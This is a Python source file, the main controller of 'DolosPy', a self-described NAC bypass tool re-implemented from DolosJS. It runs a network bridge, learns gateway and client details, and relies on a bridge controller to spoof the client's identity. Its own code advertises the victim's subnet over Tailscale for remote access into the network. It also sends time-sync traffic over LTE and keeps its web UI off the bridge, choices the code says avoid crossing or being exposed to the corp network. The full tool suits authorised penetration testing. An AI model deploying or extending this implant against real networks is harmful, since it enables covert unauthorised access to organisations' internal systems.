#!/usr/bin/env python3
"""DolosPy — NAC bypass tool.

A Python re-implementation of DolosJS.
Runs a network bridge between two NICs, sniffs traffic to discover
gateway / client info, and sets up iptables / ebtables rules to spoof
the client identity for NAC bypass.

Serves a real-time web UI on port 4444 via FastAPI + Socket.IO.
"""

import json
import logging
import signal
import subprocess
import sys
import threading
import time
from pathlib import Path

import socketio
import uvicorn
import yaml
from fastapi import FastAPI, Query, Request
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, PlainTextResponse
from fastapi.staticfiles import StaticFiles

import mac_vendor
from bridge_controller import BridgeController

# ── paths ────────────────────────────────────────────────────────────
BASE_DIR = Path(__file__).parent
RESOURCES = BASE_DIR / "resources"
TEMPLATES = RESOURCES / "templates"
LOG_DIR = BASE_DIR / "logs"

# ── logging ──────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(levelname)s  %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%S",
)
log = logging.getLogger("dolos")

# ── banner ───────────────────────────────────────────────────────────
banner_path = BASE_DIR / "banner.txt"
if banner_path.exists():
    print(banner_path.read_text())

# ── config ───────────────────────────────────────────────────────────
config_path = BASE_DIR / "config.yaml"
if not config_path.exists():
    log.error("config.yaml not found — copy one from setup/<variant>/config.yaml")
    sys.exit(1)

with open(config_path) as f:
    config = yaml.safe_load(f)

log.info("Config: %s", json.dumps(config, indent=2))

# ── bridge controller ───────────────────────────────────────────────
bridge = BridgeController(config)

# ── FastAPI + Socket.IO ──────────────────────────────────────────────
sio = socketio.AsyncServer(async_mode="asgi", cors_allowed_origins="*")
app = FastAPI(title="DolosPy")
sio_app = socketio.ASGIApp(sio, app)

# mount static files
app.mount("/static", StaticFiles(directory=str(RESOURCES / "static")), name="static")


# ── routes ───────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def homepage():
    return (TEMPLATES / "index.html").read_text()


@app.get("/favicon.ico")
async def favicon():
    return FileResponse(RESOURCES / "static" / "misc" / "favicon.ico", media_type="image/x-icon")


@app.get("/current_log", response_class=PlainTextResponse)
async def current_log():
    log_file = LOG_DIR / "current.log"
    if log_file.exists():
        return log_file.read_text()
    return ""


@app.get("/allow_internet_traffic", response_class=PlainTextResponse)
async def allow_internet_traffic():
    bridge.allow_internet_traffic()
    return "Added default route via mibr"


@app.get("/lookup_hostname", response_class=PlainTextResponse)
async def lookup_hostname():
    if bridge.net_info:
        bridge.net_info.lookup_hostname()
    return "Performing reverse lookup"


@app.post("/apply_dns", response_class=PlainTextResponse)
async def apply_dns():
    return bridge.apply_discovered_dns()


@app.post("/restore_dns", response_class=PlainTextResponse)
async def restore_dns():
    return bridge.restore_default_dns()


@app.post("/sync_time", response_class=PlainTextResponse)
async def sync_time_endpoint():
    return _sync_time()


@app.get("/reboot_schedule", response_class=JSONResponse)
async def get_reboot_schedule():
    return _read_reboot_cron()


@app.post("/reboot_schedule", response_class=PlainTextResponse)
async def set_reboot_schedule(request: Request):
    data = await request.json()
    enabled = data.get("enabled", False)
    hour = int(data.get("hour", 3))
    minute = int(data.get("minute", 0))
    if hour < 0 or hour > 23 or minute < 0 or minute > 59:
        return "Invalid time"
    return _write_reboot_cron(enabled, hour, minute)


@app.get("/send_dhcp_probe", response_class=PlainTextResponse)
async def send_dhcp_probe():
    bridge.send_dhcp_probe()
    return "Performing DHCP Discover"


@app.get("/get_vendor", response_class=PlainTextResponse)
async def get_vendor(mac_addr: str = Query(...)):
    return mac_vendor.lookup(mac_addr)


@app.get("/uptime", response_class=JSONResponse)
async def uptime():
    """Return device uptime in seconds (from /proc/uptime, not bridge start)."""
    try:
        with open("/proc/uptime") as f:
            uptime_secs = float(f.read().split()[0])
        return {"uptime_seconds": uptime_secs}
    except Exception:
        return {"uptime_seconds": 0}


@app.post("/flush_tables", response_class=PlainTextResponse)
async def flush_tables():
    bridge.flush_tables(shutdown=True)
    return "Tables flushed, shutting down"


@app.post("/advertise_routes", response_class=PlainTextResponse)
async def advertise_routes():
    if not bridge.net_info or not bridge.net_info.subnet_mask:
        return "Subnet not yet discovered"
    # calculate CIDR from gateway IP and subnet mask
    gw = bridge.net_info.gateway_ip
    mask = bridge.net_info.subnet_mask
    if not gw or not mask:
        return "Gateway/subnet not yet discovered"
    # compute network address
    gw_parts = [int(x) for x in gw.split(".")]
    mask_parts = [int(x) for x in mask.split(".")]
    net_parts = [g & m for g, m in zip(gw_parts, mask_parts)]
    prefix_len = sum(bin(m).count("1") for m in mask_parts)
    route = f"{'.'.join(str(x) for x in net_parts)}/{prefix_len}"
    try:
        result = subprocess.run(
            ["tailscale", "set", "--advertise-routes", route],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode == 0:
            return f"Advertising route: {route}"
        return f"Error: {result.stderr.strip()}"
    except Exception as exc:
        return f"Failed: {exc}"


# ── Socket.IO events ────────────────────────────────────────────────

@sio.event
async def connect(sid, environ):
    log.info("Socket connected: %s", sid)


@sio.event
async def get_update(sid):
    if bridge.net_info:
        net_info = bridge.net_info.print_info()
        await sio.emit("network_info", net_info, to=sid)
        await sio.emit("arp_info", bridge.net_info.arp_table.entries, to=sid)


# forward bridge_update events to all connected clients
def _bridge_update_handler(data):
    """Called from bridge controller threads — schedule async emit on the uvicorn event loop."""
    import asyncio
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = None

    if loop and loop.is_running():
        loop.call_soon_threadsafe(asyncio.ensure_future, sio.emit("bridge_update", data))
    else:
        # fallback: create a new event loop for this thread
        try:
            asyncio.run(sio.emit("bridge_update", data))
        except Exception:
            log.exception("Failed to emit bridge_update")


bridge.on("bridge_update", _bridge_update_handler)


# ── keyboard shortcuts (like the original) ───────────────────────────

def _keyboard_listener():
    """Read single keypresses from stdin when available."""
    import termios
    import tty

    fd = sys.stdin.fileno()
    try:
        old_settings = termios.tcgetattr(fd)
    except termios.error:
        return  # not a terminal

    try:
        tty.setraw(fd)
        while True:
            ch = sys.stdin.read(1)
            if ch == "\x03":  # Ctrl+C
                bridge.flush_tables(shutdown=True)
            elif ch == "a":
                bridge.allow_internet_traffic()
            elif ch == "d":
                bridge.send_dhcp_probe()
            elif ch == "i":
                log.info("Network Info: %s", json.dumps(bridge.net_info.print_info(), indent=4) if bridge.net_info else "N/A")
                if bridge.net_info:
                    log.info("ARP Table: %s", json.dumps(bridge.net_info.arp_table.entries, indent=4))
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)


# ── signal handling ──────────────────────────────────────────────────

def _shutdown(signum, frame):
    log.info("Received signal %s — shutting down", signum)
    bridge.flush_tables(shutdown=True)


signal.signal(signal.SIGINT, _shutdown)
signal.signal(signal.SIGTERM, _shutdown)


# ── time sync (HTTP Date header) ─────────────────────────────────

_TIME_SYNC_URLS = ["1.1.1.1", "1.0.0.1", "www.google.com"]
_time_sync_stop = threading.Event()


def _sync_time() -> str:
    """Sync system clock from HTTP Date header.

    Uses HEAD requests over LTE (not the bridge) to public servers.
    Binds to the LTE source IP to ensure traffic never goes over the bridge,
    even if the default route has been changed."""
    import email.utils
    import http.client

    for host in _TIME_SYNC_URLS:
        try:
            conn = http.client.HTTPConnection(host, timeout=5, source_address=(_get_lte_source_ip(), 0))
            conn.request("HEAD", "/")
            resp = conn.getresponse()
            date_str = resp.getheader("Date")
            conn.close()
            if not date_str:
                continue
            # parse RFC 2822 date and set system clock
            parsed = email.utils.parsedate_to_datetime(date_str)
            time_str = parsed.strftime("%Y-%m-%d %H:%M:%S")
            result = subprocess.run(
                ["date", "-s", time_str],
                capture_output=True, text=True, timeout=5,
            )
            if result.returncode == 0:
                log.info("Time synced from %s: %s", host, time_str)
                return f"Time synced: {time_str} (from {host})"
            else:
                log.warning("date -s failed: %s", result.stderr.strip())
        except Exception as exc:
            log.debug("Time sync from %s failed: %s", host, exc)
            continue
    log.warning("Time sync failed — all servers unreachable")
    return "Time sync failed — no servers reachable"


def _get_lte_source_ip() -> str:
    """Get the IP of the LTE/USB interface to use as source for time sync.
    Falls back to 0.0.0.0 (OS chooses) if no LTE interface found."""
    import netifaces
    # look for usb0, wwan0, or any non-bridge, non-tailscale, non-loopback interface
    for iface in ["usb0", "wwan0"]:
        try:
            addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
            if addrs:
                return addrs[0]["addr"]
        except (ValueError, KeyError):
            continue
    return "0.0.0.0"


def _start_time_sync_thread() -> None:
    """Background thread that syncs time every 6 hours."""
    def _loop():
        # initial sync after 30s (wait for LTE to come up)
        _time_sync_stop.wait(30)
        while not _time_sync_stop.is_set():
            _sync_time()
            _time_sync_stop.wait(6 * 3600)  # every 6 hours
    t = threading.Thread(target=_loop, daemon=True, name="time-sync")
    t.start()
    log.info("Time sync thread started (every 6h)")


# ── reboot schedule (cron) ───────────────────────────────────────────

_CRON_TAG = "# dolospy-scheduled-reboot"


def _read_reboot_cron() -> dict:
    """Read the current scheduled reboot from crontab."""
    try:
        result = subprocess.run(
            ["crontab", "-l"], capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.splitlines():
            if _CRON_TAG in line and not line.lstrip().startswith("#"):
                parts = line.split()
                return {"enabled": True, "minute": int(parts[0]), "hour": int(parts[1])}
    except Exception:
        pass
    return {"enabled": False, "hour": 3, "minute": 0}


def _write_reboot_cron(enabled: bool, hour: int, minute: int) -> str:
    """Set or remove the scheduled reboot cron entry."""
    try:
        result = subprocess.run(
            ["crontab", "-l"], capture_output=True, text=True, timeout=5
        )
        existing = result.stdout if result.returncode == 0 else ""
    except Exception:
        existing = ""

    # remove any existing dolospy reboot line
    lines = [l for l in existing.splitlines() if _CRON_TAG not in l]

    if enabled:
        lines.append(f"{minute} {hour} * * * /sbin/reboot {_CRON_TAG}")

    new_crontab = "\n".join(lines) + "\n" if lines else ""
    try:
        proc = subprocess.run(
            ["crontab", "-"], input=new_crontab, capture_output=True, text=True, timeout=5
        )
        if proc.returncode != 0:
            return f"Failed: {proc.stderr.strip()}"
    except Exception as exc:
        return f"Failed: {exc}"

    if enabled:
        log.info("Scheduled daily reboot at %02d:%02d", hour, minute)
        return f"Scheduled daily reboot at {hour:02d}:{minute:02d}"
    else:
        log.info("Removed scheduled reboot")
        return "Scheduled reboot disabled"


# ── main ─────────────────────────────────────────────────────────────

def _get_bind_host() -> str:
    """Determine the best IP to bind the web UI to.

    Prefers the Tailscale interface (100.x.x.x), falls back to the
    management/WiFi subnet (172.31.255.x), and finally localhost.
    Never binds 0.0.0.0 — that would expose the web UI on the bridge
    (169.254.x.x) to the corp network."""
    import netifaces
    # prefer tailscale, fall back to loopback
    for iface in netifaces.interfaces():
        try:
            addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
            for addr in addrs:
                ip = addr.get("addr", "")
                if ip.startswith("100."):       # Tailscale
                    log.info("Binding web UI to Tailscale IP %s (%s)", ip, iface)
                    return ip
        except Exception:
            continue
    log.warning("No Tailscale IP found — binding web UI to 127.0.0.1")
    return "127.0.0.1"


def main():
    # start bridge
    bridge.start_bridge()

    # start background time sync (replaces NTP)
    _start_time_sync_thread()

    # start keyboard listener in background
    kb_thread = threading.Thread(target=_keyboard_listener, daemon=True)
    kb_thread.start()

    # start the web server — bind only to management interfaces, never the bridge
    bind_host = _get_bind_host()
    port = config.get("webui_port", 4444)
    log.info("Starting web server on %s:%d", bind_host, port)
    uvicorn.run(sio_app, host=bind_host, port=port, log_level="info")


if __name__ == "__main__":
    main()
